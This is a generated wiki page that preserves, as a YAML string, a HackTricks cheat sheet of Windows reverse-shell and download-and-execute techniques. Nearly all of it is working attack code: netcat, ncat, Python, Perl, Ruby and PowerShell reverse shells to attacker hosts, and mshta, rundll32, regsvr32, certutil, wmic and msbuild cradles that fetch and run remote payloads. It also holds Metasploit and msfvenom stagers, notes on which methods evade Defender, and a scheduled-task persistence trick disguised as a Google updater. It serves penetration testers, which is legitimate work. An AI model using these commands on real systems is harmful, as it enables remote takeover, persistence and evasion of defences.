---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Shells - Windows

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-hacking-reverse-shells-windows` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-hacking/reverse-shells/windows.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Shells - Windows](../../topics/generic-hacking/shells-windows.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-generic-hacking-reverse-shells-windows |
| name | Shells - Windows |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-hacking/reverse-shells/windows.md |

## Preserved Source Material

````yaml
_body: "# Shells - Windows\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Lolbas\n\nThe page [lolbas-project.github.io](https://lolbas-project.github.io/)\
  \ is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.\\\nObviously, **there aren't\
  \ SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be (ab)used to perform\
  \ some kind of unexpected actions like **execute arbitrary code.**\n\n## NC\n\n```bash\nnc.exe -e cmd.exe <Attacker_IP>\
  \ <PORT>\n```\n\n## NCAT\n\nvictim\n\n```\nncat.exe <Attacker_IP> <PORT>  -e \"cmd.exe /c (cmd.exe  2>&1)\"\n#Encryption\
  \ to bypass firewall\nncat.exe <Attacker_IP> <PORT eg.443> --ssl -e \"cmd.exe /c (cmd.exe  2>&1)\"\n```\n\nattacker\n\n\
  ```\nncat -l <PORT>\n#Encryption to bypass firewall\nncat -l <PORT eg.443> --ssl\n```\n\n## SBD\n\n**[sbd](https://www.kali.org/tools/sbd/)\
  \ is a portable and secure Netcat alternative**. It works on Unix-like systems and Win32. With features like strong encryption,\
  \ program execution, customizable source ports, and continuous reconnection, sbd provides a versatile solution for TCP/IP\
  \ communication. For Windows users, the sbd.exe version from the Kali Linux distribution can be used as a reliable replacement\
  \ for Netcat.\n\n```bash\n# Victims machine\nsbd -l -p 4444 -e bash -v -n\nlistening on port 4444\n\n\n# Atackers\nsbd 10.10.10.10\
  \ 4444\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n## Python\n\n```bash\n#Windows\nC:\\Python27\\python.exe -c \"\
  (lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(),\
  \ (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except',\
  \ (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None\
  \ and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(),\
  \ type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for\
  \ __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0]\
  \ for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for\
  \ __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\
  \\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s']\
  \ in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l:\
  \ [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda:\
  \ None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda\
  \ __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1]\
  \ if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else\
  \ __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os',\
  \ __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess',\
  \ __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda\
  \ y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n```\n\n## Perl\n\n```bash\nperl -e 'use Socket;$i=\"ATTACKING-IP\"\
  ;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\
  >&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"\
  ATTACKING-IP:80\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\n## Ruby\n\n```bash\n#Windows\nruby -rsocket\
  \ -e 'c=TCPSocket.new(\"[IPADDR]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n```\n\n##\
  \ Lua\n\n```bash\nlua5.1 -e 'local host, port = \"127.0.0.1\", 4444 local socket = require(\"socket\") local tcp = socket.tcp()\
  \ local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f =\
  \ io.popen(cmd, 'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n\
  ```\n\n## OpenSSH\n\nAttacker (Kali)\n\n```bash\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days\
  \ 365 -nodes #Generate certificate\nopenssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be\
  \ able to introduce the commands\nopenssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able\
  \ to get the response\n```\n\nVictim\n\n```bash\n#Linux\nopenssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl\
  \ s_client -quiet -connect <ATTACKER_IP>:<PORT2>\n\n#Windows\nopenssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl\
  \ s_client -quiet -connect <ATTACKER_IP>:<PORT2>\n```\n\n## Powershell\n\n```bash\npowershell -exec bypass -c \"(New-Object\
  \ Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex\"\
  \npowershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')\"\nStart-Process -NoNewWindow\
  \ powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')\"\necho IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1')\
  \ | powershell -noprofile\n```\n\nProcess performing network call: **powershell.exe**\\\nPayload written on disk: **NO**\
  \ (_at least nowhere I could find using procmon !_)\n\n```bash\npowershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1\n\
  ```\n\nProcess performing network call: **svchost.exe**\\\nPayload written on disk: **WebDAV client local cache**\n\n**One\
  \ liner:**\n\n```bash\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",80);$stream = $client.GetStream();[byte[]]$bytes\
  \ = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,\
  \ $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\
  ```\n\n**Get more info about different Powershell Shells at the end of this document**\n\n## Mshta\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```bash\nmshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\"))\n```\n\n```bash\nmshta\
  \ http://webserver/payload.hta\n```\n\n```bash\nmshta \\\\webdavserver\\folder\\payload.hta\n```\n\n#### **Example of hta-psh\
  \ reverse shell (use hta to download and execute PS backdoor)**\n\n```xml\n <scRipt language=\"VBscRipT\">CreateObject(\"\
  WscrIpt.SheLL\").Run \"powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')\"\
  </scRipt>\n```\n\n**You can download & execute very easily a Koadic zombie using the stager hta**\n\n#### hta example\n\n\
  [**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)\n\n```xml\n<html>\n<head>\n<HTA:APPLICATION\
  \ ID=\"HelloExample\">\n<script language=\"jscript\">\n        var c = \"cmd.exe /c calc.exe\";\n        new ActiveXObject('WScript.Shell').Run(c);\n\
  </script>\n</head>\n<body>\n<script>self.close();</script>\n</body>\n</html>\n```\n\n#### **mshta - sct**\n\n[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)\n\
  \n```xml\n<?XML version=\"1.0\"?>\n<!-- rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";o=GetObject(\"script:http://webserver/scriplet.sct\"\
  );window.close();  -->\n<!-- mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/scriplet.sct\"\")\"))\
  \ -->\n<!-- mshta vbscript:Close(Execute(\"GetObject(\"\"script:C:\\local\\path\\scriptlet.sct\"\")\")) -->\n<scriptlet>\n\
  <public>\n</public>\n<script language=\"JScript\">\n<![CDATA[\n    var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"\
  );\n]]>\n</script>\n</scriptlet>\n```\n\n#### **Mshta - Metasploit**\n\n```bash\nuse exploit/windows/misc/hta_server\nmsf\
  \ exploit(windows/misc/hta_server) > set srvhost 192.168.1.109\nmsf exploit(windows/misc/hta_server) > set lhost 192.168.1.109\n\
  msf exploit(windows/misc/hta_server) > exploit\n```\n\n```bash\nVictim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta\
  \ #The file name is given in the output of metasploit\n```\n\n**Detected by defender**\n\n## **Rundll32**\n\n[**Dll hello\
  \ world example**](https://github.com/carterjones/hello-world-dll)\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```bash\nrundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint\n```\n\n```bash\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"\
  ;o=GetObject(\"script:http://webserver/payload.sct\");window.close();\n```\n\n**Detected by defender**\n\n**Rundll32 - sct**\n\
  \n[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)\n\n```xml\n<?XML version=\"1.0\"?>\n\
  <!-- rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";o=GetObject(\"script:http://webserver/scriplet.sct\");window.close();\
  \  -->\n<!-- mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/scriplet.sct\"\")\")) -->\n<scriptlet>\n\
  <public>\n</public>\n<script language=\"JScript\">\n<![CDATA[\n    var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"\
  );\n]]>\n</script>\n</scriptlet>\n```\n\n#### **Rundll32 - Metasploit**\n\n```bash\nuse windows/smb/smb_delivery\nrun\n\
  #You will be given the command to run in the victim: rundll32.exe \\\\10.2.0.5\\Iwvc\\test.dll,0\n```\n\n**Rundll32 - Koadic**\n\
  \n```bash\nuse stager/js/rundll32_js\nset SRVHOST 192.168.1.107\nset ENDPOINT sales\nrun\n#Koadic will tell you what you\
  \ need to execute inside the victim, it will be something like:\nrundll32.exe javascript:\"\\..\\mshtml, RunHTMLApplication\
  \ \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"http://10.2.0.5:9997/ownmG\",false);x.send();eval(x.responseText);window.close();\n\
  ```\n\n## Regsvr32\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```bash\nregsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll\n```\n\n```\nregsvr32 /u /n /s /i:\\\\webdavserver\\\
  folder\\payload.sct scrobj.dll\n```\n\n**Detected by defender**\n\n#### Regsvr32 – arbitrary DLL export with /i argument\
  \ (gatekeeping & persistence)\n\nBesides loading remote scriptlets (`scrobj.dll`), `regsvr32.exe` will load a local DLL\
  \ and invoke its `DllRegisterServer`/`DllUnregisterServer` exports. Custom loaders frequently abuse this to execute arbitrary\
  \ code while blending with a signed LOLBin. Two tradecraft notes seen in the wild:\n\n- Gatekeeping argument: the DLL exits\
  \ unless a specific switch is passed via `/i:<arg>`, e.g. `/i:--type=renderer` to mimic Chromium renderer children. This\
  \ reduces accidental execution and frustrates sandboxes.\n- Persistence: schedule `regsvr32` to run the DLL with silent\
  \ + high privileges and the required `/i` argument, masquerading as an updater task:\n  ```powershell\n  Register-ScheduledTask\
  \ \\\n    -Action (New-ScheduledTaskAction -Execute \"regsvr32\" -Argument \"/s /i:--type=renderer \\\"%APPDATA%\\Microsoft\\\
  SystemCertificates\\<name>.dll\\\"\") \\\n    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval\
  \ (New-TimeSpan -Minutes 1)) \\\n    -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \\\n    -TaskPath '\\\
  \\GoogleSystem\\\\GoogleUpdater' \\\n    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\
  \ -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \\\n    -RunLevel Highest\n  ```\n\nSee also: ClickFix clipboard‑to‑PowerShell\
  \ variant that stages a JS loader and later persists with `regsvr32`.\n{{#ref}}\n../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md\n\
  {{#endref}}\n\n\n[**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)\n\n```html\n<?XML version=\"\
  1.0\"?>\n<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->\n<!-- regsvr32 /u /n /s /i:\\\\webdavserver\\\
  folder\\regsvr32.sct scrobj.dll -->\n<scriptlet>\n<registration\n    progid=\"PoC\"\n    classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\"\
  \ >\n    <script language=\"JScript\">\n        <![CDATA[\n            var r = new ActiveXObject(\"WScript.Shell\").Run(\"\
  calc.exe\");\n        ]]>\n</script>\n</registration>\n</scriptlet>\n```\n\n#### **Regsvr32 - Metasploit**\n\n```bash\n\
  use multi/script/web_delivery\nset target 3\nset payload windows/meterpreter/reverse/tcp\nset lhost 10.2.0.5\nrun\n#You\
  \ will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll\n\
  ```\n\n**You can download & execute very easily a Koadic zombie using the stager regsvr**\n\n## Certutil\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \nDownload a B64dll, decode it and execute it.\n\n```bash\ncertutil -urlcache -split -f http://webserver/payload.b64 payload.b64\
  \ & certutil -decode payload.b64 payload.dll & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile=\
  \ /LogToConsole=false /u payload.dll\n```\n\nDownload a B64exe, decode it and execute it.\n\n```bash\ncertutil -urlcache\
  \ -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe\n```\n\n**Detected\
  \ by defender**\n\n## **Cscript/Wscript**\n\n```bash\npowershell.exe -c \"(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\\\
  \"$env:temp\\test.vbs\\\");Start-Process %windir%\\system32\\cscript.exe \\\"$env:temp\\test.vbs\\\"\"\n```\n\n**Cscript\
  \ - Metasploit**\n\n```bash\nmsfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs\n```\n\
  \n**Detected by defender**\n\n## PS-Bat\n\n```bash\n\\\\webdavserver\\folder\\batchfile.bat\n```\n\nProcess performing network\
  \ call: **svchost.exe**\\\nPayload written on disk: **WebDAV client local cache**\n\n```bash\nmsfvenom -p cmd/windows/reverse_powershell\
  \ lhost=10.2.0.5 lport=4444 > shell.bat\nimpacket-smbserver -smb2support kali `pwd`\n```\n\n```bash\n\\\\10.8.0.3\\kali\\\
  shell.bat\n```\n\n**Detected by defender**\n\n## **MSIExec**\n\nAttacker\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ lhost=10.2.0.5 lport=1234 -f msi > shell.msi\npython -m SimpleHTTPServer 80\n```\n\nVictim:\n\n```\nvictim> msiexec /quiet\
  \ /i \\\\10.2.0.5\\kali\\shell.msi\n```\n\n**Detected**\n\n## **Wmic**\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```bash\nwmic os get /format:\"https://webserver/payload.xsl\"\n```\n\nExample xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):\n\
  \n```xml\n<?xml version='1.0'?>\n<stylesheet xmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\"\
  \ xmlns:user=\"placeholder\" version=\"1.0\">\n<output method=\"text\"/>\n    <ms:script implements-prefix=\"user\" language=\"\
  JScript\">\n        <![CDATA[\n            var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /c echo IEX(New-Object\
  \ Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -\");\n        ]]>\n    </ms:script>\n\
  </stylesheet>\n```\n\n**Not detected**\n\n**You can download & execute very easily a Koadic zombie using the stager wmic**\n\
  \n## Msbuild\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```\ncmd /V /c \"set MB=\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\" & !MB! /noautoresponse /preprocess\
  \ \\\\webdavserver\\folder\\payload.xml > payload.xml & !MB! payload.xml\"\n```\n\nYou can use this technique to bypass\
  \ Application Whitelisting and Powershell.exe restrictions. As you will be prompted with a PS shell.\\\nJust download this\
  \ and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)\n\
  \n```\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe MSBuildShell.csproj\n```\n\n**Not detected**\n\n##\
  \ **CSC**\n\nCompile C# code in the victim machine.\n\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\
  \ /unsafe /out:shell.exe shell.cs\n```\n\nYou can download a basic C# reverse shell from here: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)\n\
  \n**Not deteted**\n\n## **Regasm/Regsvc**\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```bash\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll\n```\n\
  \n**I haven't tried it**\n\n[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)\n\
  \n## Odbcconf\n\n- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  \n```bash\nodbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt}\n```\n\n**I haven't tried it**\n\n[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)\n\
  \n## Powershell Shells\n\n### PS-Nishang\n\n[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)\n\
  \nIn the **Shells** folder, there are a lot of different shells. To download and execute Invoke-_PowerShellTcp.ps1_ make\
  \ a copy of the script and append to the end of the file:\n\n```\nInvoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port\
  \ 4444\n```\n\nStart serving the script in a web server and execute it on the victim's end:\n\n```\npowershell -exec bypass\
  \ -c \"iwr('http://10.11.0.134/shell2.ps1')|iex\"\n```\n\nDefender doesn't detect it as malicious code (yet, 3/04/2019).\n\
  \n**TODO: Check other nishang shells**\n\n### **PS-Powercat**\n\n[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)\n\
  \nDownload, start a web server, start the listener, and execute it on the victim's end:\n\n```\n powershell -exec bypass\
  \ -c \"iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd\"\n```\n\nDefender doesn't detect it\
  \ as malicious code (yet, 3/04/2019).\n\n**Other options offered by powercat:**\n\nBind shells, Reverse shell (TCP, UDP,\
  \ DNS), Port redirect, upload/download, Generate payloads, Serve files...\n\n```\nServe a cmd Shell:\n    powercat -l -p\
  \ 443 -e cmd\nSend a cmd Shell:\n    powercat -c 10.1.1.1 -p 443 -e cmd\nSend a powershell:\n    powercat -c 10.1.1.1 -p\
  \ 443 -ep\nSend a powershell UDP:\n    powercat -c 10.1.1.1 -p 443 -ep -u\nTCP Listener to TCP Client Relay:\n    powercat\
  \ -l -p 8000 -r tcp:10.1.1.16:443\nGenerate a reverse tcp payload which connects back to 10.1.1.15 port 443:\n    powercat\
  \ -c 10.1.1.15 -p 443 -e cmd -g\nStart A Persistent Server That Serves a File:\n    powercat -l -p 443 -i C:\\inputfile\
  \ -rep\n```\n\n### Empire\n\n[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)\n\nCreate\
  \ a powershell launcher, save it in a file and download and execute it.\n\n```\npowershell -exec bypass -c \"iwr('http://10.2.0.5/launcher.ps1')|iex;powercat\
  \ -c 10.2.0.5 -p 4444 -e cmd\"\n```\n\n**Detected as malicious code**\n\n### MSF-Unicorn\n\n[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)\n\
  \nCreate a powershell version of metasploit backdoor using unicorn\n\n```\npython unicorn.py windows/meterpreter/reverse_https\
  \ 10.2.0.5 443\n```\n\nStart msfconsole with the created resource:\n\n```\nmsfconsole -r unicorn.rc\n```\n\nStart a web\
  \ server serving the _powershell_attack.txt_ file and execute in the victim:\n\n```\npowershell -exec bypass -c \"iwr('http://10.2.0.5/powershell_attack.txt')|iex\"\
  \n```\n\n**Detected as malicious code**\n\n## More\n\n[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console with\
  \ some offensive PS modules preloaded (cyphered)\\\n[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\\\
  \nWinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection (IEX)\n\
  \n## References\n\n- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)\n\
  - [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)\n- [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)\n\
  - [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)\n\
  - [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)\n\
  - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)\n\
  - [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\
  - [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: generic-hacking/reverse-shells/windows.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-hacking/reverse-shells/windows.md
````
